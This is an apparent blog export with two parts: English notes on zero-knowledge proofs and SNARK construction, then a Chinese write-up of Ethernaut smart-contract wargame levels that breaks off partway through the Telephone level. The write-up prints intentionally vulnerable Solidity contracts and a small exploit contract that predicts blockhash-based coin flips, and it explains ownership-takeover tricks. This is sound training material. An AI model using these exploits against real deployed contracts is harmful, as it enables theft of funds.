just compute in Polynominal-time(<strong>PPT</strong>)</li>
</ul>
<p>e.g., the prover proves to the color-blind verifier that a flag has
two colors, the verifier flips a coin to decide whether to flip the
flag, and the prover guesses the result of the coin based on the flags'
obverse and reverse. And if we repeat the progress k times, the $
prob_{coins}((1/2)^k$</p>
<h3 id="define-interactive-proofs">Define Interactive Proofs</h3>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230523142952475-1687768226894.png" alt="image-20230523142952475"> <span class="math display">\[
\begin{align*}\label{eq1}
  &amp; \text{completeness means if x} \in L,\;V\text{ always accepts}\\
&amp; \text{soundness means if x} \notin L,\; \text{for all }
\textcolor[rgb]{0,0,1}{cheating \;prover\;strategy},V \text{ will not
accept except with negligible probability. }
\end{align*}
\]</span> so class of languages <strong>IP = {L for which there is an
interactive proof}</strong></p>
<h3 id="what-is-zero-knowledge">What is zero-knowledge</h3>
<p>For true Statements, What the verifier can compute
<strong>after</strong> the interaction = What the verifier could have
computed before interaction</p>
<p>Now we introduce the concept of simulation paradigm</p>
<h3 id="the-simulation-paradigm">The Simulation Paradigm</h3>
<p>V’s view gives him nothing new, if he could have simulated it its own
s.t <code>simulated view</code> and <code>real-view</code> are
<strong>computationally-Indistinguishable</strong></p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230523150750929.png" alt="image-20230523150750929"></p>
<p>Working through a Simulation for QR Protocol: <span class="math display">\[
\begin{align}
&amp; view_V(P,V):\\
&amp; Transcript = (s, b, z)\\
&amp; Coins = b
\end{align}
\]</span> so the output of simulation should be (s, b, z)</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230523152110707.png" alt="image-20230523152110707"></p>
<h3 id="computational-indistinguishability">Computational
Indistinguishability</h3>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230523150823383.png" alt="image-20230523150823383"></p>
<p>For all distinguisher algorithms D, even after receiving a polynomial
number of samples from <span class="math inline">\(D_b, \text{Prob[D
guesses b] &lt;1/2 + negl(k)}\)</span></p>
<h3 id="zero-knowledge-definition">Zero Knowledge: Definition</h3>
<p>An Interactive Protocol (P,V) is zero-knowledge for a language <span class="math inline">\(L\)</span> if there exists a <span class="math inline">\(\textcolor[rgb]{0,0,1}{PPT}\)</span> algorithm Sim
(a simulator) such that $ L,$ the following two probability
distributions are <span class="math inline">\(\textcolor[rgb]{0,0,1}{poly-time}\)</span>
indistinguishable:</p>
<ol type="1">
<li><span class="math inline">\(View_V(P,V)[x] =
{(q_1,a_1,q_2,a_2,…,coins\;of\; V)}\)</span></li>
<li><span class="math inline">\(Sim(x, 1^{\lambda}),\lambda\text{-
security parameter allows sufficient Runtime onn small x}\)</span></li>
</ol>
<p>and we can get the <strong>define</strong>: (P,V) is a zero-knowledge
interactive protocol if it is complete, sound and zero-knowledge.</p>
<p>but what if V is not honest? we need a further definition:</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230523153110540.png" alt="image-20230523153110540"></p>
<p>also, there are several types of ZK:</p>
<ul>
<li>Computationally indistinguishable distributions = CZK</li>
<li>Perfectly identical distributions = PZK</li>
<li>Statistically close distributions = SZK</li>
</ul>
<h2 id="zk-proof-of-knowledge">ZK proof of Knowledge</h2>
<p>it seems prover can not only prove the claim x(e.g. y is the
quadratic residual under mode N), but also she knows more(the square
root of y mod N), so we need extractor to get the knowledge.</p>
<p>the concept of ZKPOK is as follows:</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230523193610535.png" alt="image-20230523193610535"></p>
<h2 id="miscellaneous">Miscellaneous</h2>
<h3 id="do-all-np-languages-have-zero-knowledge-interactive-proofs">do
all NP Languages have Zero Knowledge Interactive Proofs?</h3>
<p>the answer is <strong>yes</strong>!</p>
<p><strong>Theorem[GMW86,Naor]</strong>: If one-way functions exist,
then every L in NP has computational zero knowledge interactive
proofs</p>
<p>the ideas of the proof:</p>
<ol type="1">
<li><strong>[GMW87]</strong> Showed ZK interactive proof for G3-COLOR
using bit- commitments
<ul>
<li>for any L in NP, <span class="math inline">\(L &lt;_p
\text{G3-COLOR}\)</span>(due to NPC reducibility)</li>
<li>every instance x can be reduced to graph <span class="math inline">\(G_x\)</span> such that:
<ul>
<li>if x in L the <span class="math inline">\(G_x\)</span> is 3
colorable; if not, <span class="math inline">\(G_x\)</span> is not 3
colorable</li>
</ul></li>
</ul></li>
<li><strong>[Naor]</strong> showed if One Way Function exits, then bit
commitment protocol exits.</li>
</ol>
<h3 id="bit-commitment-protocol">Bit Commitment Protocol</h3>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230523195408388.png" alt="image-20230523195408388"></p>
<p>i think it's a kind of variant of signature?</p>
<p>CZK examples</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230523195948302.png" alt="image-20230523195948302"></p>
<h3 id="quiz">quiz</h3>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230523201302340.png" alt="image-20230523201302340"></p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230523201308019.png" alt="image-20230523201308019"></p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230523201313789.png" alt="image-20230523201313789"></p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230523201318111.png" alt="image-20230523201318111"></p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230523201324211.png" alt="image-20230523201324211"></p>
<h1 id="overview-of-modern-snark-constructions">Overview of Modern SNARK
Constructions</h1>
<p>this class is focusing on <strong>None-Interactive Proof</strong></p>
<h2 id="what-is-a-snark">What is a SNARK?</h2>
<h3 id="review-arithmetic-circuits">review arithmetic circuits</h3>
<p>arithmetic circuits: <span class="math inline">\(C: \text{F}^n
\rightarrow \text{F and |C| = # gates in }C\)</span></p>
<h4 id="categories">categories</h4>
<ul>
<li>An <u>unstructured circuit</u>: a circuit with arbitrary wires</li>
<li>A <u>structured circuit</u>: <img src="/images/Zero-Knowledge-Proofs/image-20230524222300092.png" alt="image-20230524222300092"></li>
</ul>
<p><strong>M is often called a virtual machine (VM) -- one step of a
processor</strong></p>
<h3 id="preprocessing-nark-non-interactive-argument-of-knowledge">(preprocessing)
NARK: Non-interactive ARgument of Knowledge</h3>
<p>Definition: $$ <span class="math display">\[\begin{align*}\label{lab3}
&amp; Premilinary:\\
&amp;  \text{public arithmetic circuit: }C(x,w) \rightarrow
\text{F},\text{where } x\text{ is the statement in }F^n, \text{and
}w\text{ is the secret witness in }F^m\\
&amp;  \text{Preprocessing(setup): S(}C\text{)}\rightarrow \text{public
parameters }(pp, vp)\\
&amp; \text{so a preprocessing NARK is a triple }(S,P,V):\\

&amp; \bullet\text{S(C)} \rightarrow \text{public parameters (pp, vp)
for prover and verifier}\\
&amp; \bullet\text{P(pp, x, w)} \rightarrow \text{proof }\pi\\
&amp; \bullet\text{V(vp, x, }\pi \text{)} \rightarrow \text{accept or
reject}
\end{align*}\]</span> $$ <img src="/images/Zero-Knowledge-Proofs/image-20230524223927289.png" alt="image-20230524223927289"></p>
<h4 id="requirements-informal">requirements (informal)</h4>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230524223949298.png" alt="image-20230524223949298"></p>
<h4 id="types-of-preprocessing-setup">Types of preprocessing Setup</h4>
<p>Setup for circuit C: <span class="math inline">\(S(C, r) \rightarrow
\text{public parameters }(pp, vp)\)</span> where r is a random bit</p>
<ul>
<li>trusted setup per circuit: S(C, r) random r must be kept secret from
prover</li>
<li>trusted but universal (updatable) setup: secret r is independt of C
<ul>
<li>$ S = (S_{init}, S_{index})$</li>
<li><span class="math inline">\(S_{init}(\lambda;r)\rightarrow \text{gp,
which is one-time setup by secret r}\)</span></li>
<li><span class="math inline">\(S_{index}(gp,C)\rightarrow(pp, vp),
\text{which is used many times}\)</span></li>
</ul></li>
<li>transparent setup: S(C) does not use secret data(or trusted
setup)</li>
</ul>
<p>for example:</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230524225626646.png" alt="image-20230524225626646"></p>
<h4 id="knowledge-soundness">knowledge soundness</h4>
<p><span class="math inline">\(\text{how can we know P &quot;know&quot;
w?} \rightarrow \text{P knows w, if w can be extracted from
P}\)</span></p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230524230400145.png" alt="image-20230524230400145"></p>
<p>I think the A here is to consider all P (honest d + malicious)</p>
<h3 id="snark-a-succinct-argument-of-knowledge">SNARK: a Succinct
ARgument of Knowledge</h3>
<p>a succinct proprocessing NARK is a triple(S, P, V) balabala(see
above)</p>
<ul>
<li>need a <strong>short</strong> proof (len(<span class="math inline">\(\pi\)</span>)=sublinear(|w|))</li>
<li>fast to verify (time(V)=<span class="math inline">\(O_\lambda(|x|,
sublinear(|C|))\)</span>) (allowing verifier sufficient time to know x
but cant learn all of C, so vp is a short summary of circuit)</li>
</ul>
<p>so SNARK is a <strong>NARK</strong>(with complete and knowledge
sound) that is succinct.</p>
<p>zk-SNARK is a SNARK that is also zero knowledge</p>
<h2 id="building-an-efficient-snark">Building an efficient SNARK</h2>
<p>we just need two steps to get a <strong>SNARK for general
circuits</strong>, combining:</p>
<ul>
<li><strong>A functional commitment scheme</strong> (Cryptographic
object)</li>
<li><strong>A compatible interactive oracle proof</strong>(IOP, which is
information theoretic object)</li>
</ul>
<h4 id="commitments">Commitments</h4>
<p><strong>two algorithms</strong>:</p>
<ul>
<li><span class="math inline">\(commit(m,r)\rightarrow com
\;\;\;\;\;\text{(r chosen at random)}\)</span></li>
<li><span class="math inline">\(verify(m,com,r)\rightarrow \text{accept
or reject}\)</span></li>
</ul>
<p>Properties: (informal)</p>
<ul>
<li>binding: <span class="math inline">\(\rightarrow \text{a malicious
committer cant produce a commitment and there is no two valid openings
for com}\)</span></li>
<li>hiding: <span class="math inline">\(\rightarrow \text{com reveals
nothing about committed data}\)</span></li>
</ul>
<p><u>for example:</u></p>
<p>use Hash function as commitment</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230525130450691.png" alt="image-20230525130450691"></p>
<h5 id="committing-to-a-function">Committing to a function</h5>
<p>next picture shows <strong>how</strong> to committe to a
function:</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230525130646106.png" alt="image-20230525130646106"></p>
<p>the <strong>definition</strong> of committing to a function:</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230525130843430.png" alt="image-20230525130843430"></p>
<h5 id="four-important-functional-commitments">Four important functional
commitments</h5>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230525130947030.png" alt="image-20230525130947030"></p>
<h5 id="equality-test-protocol">equality test protocol</h5>
<p>there is a useful observation: <span class="math display">\[
\begin{align}
&amp; \text{for a }f\in F_{p}^{(\leq d)}[X],\text{ and } r
\stackrel{$}{\leftarrow}F_p: Pr[f(r) = 0] \leq d/p \;(*)\\
&amp; \text{suppose p}  \approx2^{256} \text{and d} \leq
2^{40},\text{the d/p is negligible}\\
&amp; \text{so for }r \stackrel{$}{\leftarrow}F_p: \text{ if f(r)=0 then
f is identically zero w.h.p}\\
&amp; \text{this is a simple zere test for a committed polynomial}
\end{align}
\]</span> further， <strong>SZDL lemma</strong>: (*) also holds for
multivariate polynomials (where d is total degree of f)</p>
<p>now we can get this:</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230525132124326.png" alt="image-20230525132124326"></p>
<p>which is a simple <strong>equality test</strong> for two committed
polynomials.</p>
<p>so the equalitty test protocol is:</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230525132221418.png" alt="image-20230525132221418"></p>
<p>but this is interactive, we want <strong>none-interactive</strong> to
make it a SNARK, the <strong>Fiat-Shamir transform</strong> can do
it.</p>
<p><strong>The Fiat-Shamir transform</strong>: <span class="math inline">\(H:M\rightarrow R \text{ a cryptographic hash
function}\)</span>, the idea: prover generates verifier's random bits on
its own using H</p>
<p>H is also modeled as a Random Oracle (RO)</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230525132556241.png" alt="image-20230525132556241"></p>
<p>now we can get a SNARK for polynomial equality testing (just let the
r generated by H)</p>
<h4 id="f-iop-poly-iop"><span class="math inline">\(F-IOP\)</span> (Poly
IOP)</h4>
<p><strong>Goal</strong>: make a functional commitment to a SNARK for
general circuits</p>
<p><em>example</em> :</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230525164356620.png" alt="image-20230525164356620"></p>
<p>Here's how F-IOP works:</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230525165835815.png" alt="image-20230525165835815"></p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230525165846209.png" alt="image-20230525165846209"></p>
<p>properties:</p>
<ul>
<li><strong>Complete</strong>: <span class="math inline">\(if \; \exists
w:C(x,w)=0 \text{ then Pr[verifier accepts]=1}\)</span></li>
<li>(Unconditional) knowledge sound (as an IOP): [<span class="math inline">\(\text{extractor is given }(x, f_1,r_1,...,r_{t-1},
f_t) \text{ and outputs w}\)</span>]</li>
<li>Optional: <strong>Zero knowledge</strong> (for a zk-SNARK)</li>
</ul>
<p><em>example</em>:</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230525171633287.png" alt="image-20230525171633287"></p>
<p>although this process is interactive, we can use Fiat-Sharmir
transformer to turn it to an none-interactive process(SNARK)</p>
<h2 id="miscellaneous-1">Miscellaneous</h2>
<h3 id="question">question</h3>
<ol type="1">
<li>In the Poly-IOP example listed above, sending the commitment of f
and q to the verifier is what is done. According to the definition of
commitment, there needs to be f and random r to open and verify, but
apparently the verifier does not have this data (This problem also
exists in other examples) (this problem may be because I do not know
about commitment)</li>
</ol>
<h3 id="quiz-1">quiz</h3>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230525190022314.png" alt="image-20230525190022314"></p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230525190028070.png" alt="image-20230525190028070"></p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230525190035739.png" alt="image-20230525190035739"></p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230525190040511.png" alt="image-20230525190040511"></p>
<h1 id="libraries-and-compilers-to-build-zkp">Libraries and Compilers to
build ZKP</h1>
<p>introducting how to instance a zkp</p>
<h2 id="zkp-programmability">ZKP Programmability</h2>
<p>something about <span class="math inline">\(\phi\)</span>:</p>
<ol type="1">
<li>in theory, witness w can be a factorization of integer x, is the sk
for pk x</li>
<li>in practice, <span class="math inline">\(\phi\)</span> is an
"<strong>arithmetic circuit</strong>", over inputs x and w.</li>
</ol>
<p>AC as circuit has inputs, gates and wires</p>
<h3 id="r1cs-format-for-zkp-acs">R1CS: format for ZKP ACs</h3>
<ul>
<li>x: field elements <span class="math inline">\(x_1,
...x_l\)</span></li>
<li>w: <span class="math inline">\(w_1, ...w_{m-l-1}\)</span></li>
<li><span class="math inline">\(\phi\)</span>: n equations of form:
<ul>
<li><span class="math inline">\(\alpha \times\beta=\gamma\)</span></li>
</ul></li>
</ul>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230602152443353.png" alt="image-20230602152443353"></p>
<p>The definition of the extension is matrix-based, but we can treat
each of these row vectors as a linear R1CS:</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230602152726766.png" alt="image-20230602152726766"></p>
<p>The next step is to build R1CS from three parts: HDL, Library,
Compiler, using examples that are all Sudoku</p>
<h2 id="hdluse-circom">HDL(use Circom)</h2>
<p>PL VS HDL:</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230602160136344.png" alt="image-20230602160136344"></p>
<p>Circom does:</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230602161417667.png" alt="image-20230602161417667"></p>
<p>https://docs.circom.io/</p>
<p>there are several basic method in the code, like judging two nums not
equal, num in range of 4bits, and advanced applications.</p>
<p>code:
https://github.com/rdi-berkeley/zkp-course-lecture3-code/blob/main/circom/sudoku.circom</p>
<h2 id="libraryuse-arkwork">library(use arkwork)</h2>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230602162155729.png" alt="image-20230602162155729"></p>
<p>so we can just use this library in some certain pl, just using their
syntax.</p>
<p>https://github.com/arkworks-rs/r1cs-tutorial/</p>
<p>code:
https://github.com/rdi-berkeley/zkp-course-lecture3-code/tree/main/arkworks</p>
<h2 id="compileruse-zokrates">compiler(use ZoKrates)</h2>
<p>the idea of this way is using variables, functions, and arrays in the
circuit.</p>
<p>but there is <strong>no way</strong> to compute witness(?), all
witness must be provided as input.</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230602162911169.png" alt="image-20230602162911169"></p>
<p>code:https://github.com/rdi-berkeley/zkp-course-lecture3-code/blob/main/zokrates/root.zok</p>
<h2 id="an-overview-of-prominent-zkp-toolchains">An overview of
prominent ZKP toolchains</h2>
<p>comparison:</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230602163154657.png" alt="image-20230602163154657"></p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230602163200099.png" alt="image-20230602163200099"></p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230602163204782.png" alt="image-20230602163204782"></p>
<p>other tools:</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230602163225247.png" alt="image-20230602163225247"></p>
<h2 id="misc">Misc</h2>
<p>quiz:</p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230602163954149.png" alt="image-20230602163954149"></p>
<h1 id="interactive-proofs">Interactive Proofs</h1>
<p>Introducing ip and checksum protocols</p>
<h1 id="plonk-interactive-oracle-proofs-iop">Plonk Interactive Oracle
Proofs (IOP)</h1>
<p>introducing widely used SNARK called Plonk, understanding all the
component that make up the SNARK.</p>
<h1 id="discrete-log-based-polynomial-commitments">Discrete-log-based
Polynomial Commitments</h1>
<h1 id="zkp-based-on-error-correcting-codes">ZKP based on
Error-Correcting Codes</h1>
<h2 id="error-correcting-codes">error-correcting codes</h2>
<h2 id="polynomial-commitment-based-on-error-correcting-codes">polynomial
commitment based on error-correcting codes</h2>
<h2 id="linear-time-encodable-code-based-on-expanders">linear-time
encodable code based on expanders</h2>
]]></content>
      <categories>
        <category>ZKP</category>
      </categories>
      <tags>
        <tag>ZKP</tag>
      </tags>
  </entry>
  <entry>
    <title>ethernaut</title>
    <url>/2023/04/03/2023/ethernaut/</url>
    <content><![CDATA[<p>打靶场的记录</p>
<span id="more"></span>
<h1 id="hello-ethernaut"><strong>Hello Ethernaut</strong></h1>
<p>连接小狐狸后按照提示做即可</p>
<p><img src="/images/ethernaut/image-20230321104045420.png" alt="image-20230321104045420"></p>
<p>然后提交示例（作者好有意思啊</p>
<p><img src="/images/ethernaut/image-20230321104122333.png" alt="image-20230321104122333"></p>
<p>过关后还能得到源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Instance &#123;</span><br><span class="line"></span><br><span class="line">  string public password;</span><br><span class="line">  uint8 public infoNum = 42;</span><br><span class="line">  string public theMethodName = &#x27;The method name is method7123949.&#x27;;</span><br><span class="line">  bool private cleared = false;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _password) &#123;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;You will find what you need in info1().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info1() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info2(string memory param) public pure returns (string memory) &#123;</span><br><span class="line">    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&#x27;hello&#x27;))) &#123;</span><br><span class="line">      return &#x27;The property infoNum holds the number of the next info method to call.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    return &#x27;Wrong parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info42() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;theMethodName is the name of the next method.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function method7123949() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;If you know the password, submit it to authenticate().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function authenticate(string memory passkey) public &#123;</span><br><span class="line">    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) &#123;</span><br><span class="line">      cleared = true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getCleared() public view returns (bool) &#123;</span><br><span class="line">    return cleared;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="fallback"><strong>Fallback</strong></h1>
<p>合约：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    payable(owner).transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>目标：</p>
<ul>
<li>成为owner</li>
<li>清空合约账户</li>
</ul>
<p>可以看到在withdraw函数可以直接转走合约地址的余额，但是要首先成为owner；同时，有两个地方可以成为owner：</p>
<ol type="1">
<li><p>contribute，但限定了每次传入的数据，要满足条件的话需要执行10^6次</p></li>
<li><p>receive，这是一个特殊的函数，当向合约发送数据时会被自动调用。而且条件只需要让传入的数据和数组里的值大于0即可。同时，官方文档是这么描述receive的：</p>
<p><img src="/images/ethernaut/image-20230405230527117.png" alt="image-20230405230527117"></p>
<p>那么我们需要执行的操作就是，先调用contribute使得contributions[msg.sender]&gt;0，然后再向合约发送wei，再调用withdraw转走合约余额。</p>
<p>注意，我们向合约发送的单位是wei，而题中的单位为ether：</p>
<p><img src="/images/ethernaut/image-20230405230900958.png" alt="image-20230405230900958"></p>
<p>修改owner：</p>
<p><img src="/images/ethernaut/image-20230405230830479.png" alt="image-20230405230830479"></p></li>
</ol>
<p>可以看到owner已经被修改，然后即可通关。</p>
<h1 id="fallout">Fallout</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  /* constructor */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        require(</span><br><span class="line">	            msg.sender == owner,</span><br><span class="line">	            &quot;caller is not the owner&quot;</span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求是成为owner。</p>
<p>这关更简单了，直接调用Fal1out就行了。</p>
<p>原来背景是有一家公司改了合约名但是没改构造函数的名字，损失++</p>
<h1 id="coin-flip"><strong>Coin Flip</strong></h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>目标：猜对硬币10次</p>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface CoinFlip&#123;</span><br><span class="line">    function flip(bool _guess) external returns(bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    CoinFlip interact;</span><br><span class="line"></span><br><span class="line">    constructor(address _address)&#123;</span><br><span class="line">        interact = CoinFlip(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess() public &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool _guess = coinFlip == 1 ? true : false;   </span><br><span class="line">        interact.flip(_guess);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>交互10次即可。</p>
<p>背景指出在区块链上生成随机数是很难的，建议用<a href="https://docs.chain.link/docs/get-a-random-number">Chainlink
VRF</a>之类的</p>
<h1 id="telephone"><strong>Telephone</strong></h1>
<p>源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>目标是要成为合约的owner，让tx.origin != msg.sender成立。</p>
<p>二者的区别:</p>
<ul>
<li>tx.origin会遍历整个调用栈并返回最初发送调用（或交易）的帐户的地址。</li>
<li>msg.sender为直接调用智能合约功能的帐户或智能合约的地址</li>
</ul>
<p>简单的说，只要写一个合约去调用changeOwner函数，那么msg.sender就会是合约地址，而tx.origin仍然是我的账户的地址，就可以满足判断：</p>
